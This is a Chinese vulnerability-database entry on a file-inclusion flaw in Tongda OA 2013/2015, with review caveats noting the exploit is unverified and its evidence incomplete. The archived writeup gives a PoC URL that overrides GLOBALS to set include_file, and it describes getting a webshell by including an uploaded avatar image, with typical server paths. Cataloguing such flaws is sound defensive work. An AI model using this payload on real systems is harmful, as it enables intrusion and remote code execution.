---
source: "hatch 补库批 20260928"
title: "通达OA menu_left include_file包含"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2013/2015"
prerequisites: "头像上传前提需账号，入口鉴权未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEoa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-4f0ad8a14cda74de80d1560f"
entity_id: "ve-4f0ad8a14cda74de80d1560f"
schema_version: "1"
---

# 通达OA menu_left include_file包含

## 条目说明

- 对象与具体问题：通达OA；menu_left include_file包含
- 版本、配置及部署条件：2013/2015
- 认证与权限前提：头像上传前提需账号，入口鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 单URL与头像路径提示，尾image缺证据
- GLOBALS覆盖前提及include扩展限制未解释，与gateway不同端点

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

2013、2015版本

三、复现过程
------------

poc

    http://0-sec.org/inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&include_file=../inc/js/menu_left.js

通常情况下，在控制⾯板中上传⼀个jpg头像，然后利用该⻚面的⽂件包含getshell。通达OA网站的根⽬录
一般在D:\\MYOA\\webroot中,头像附件一般在D:\\MYOA\\webroot\\attachment\\avatar\\XXX.jpg

image
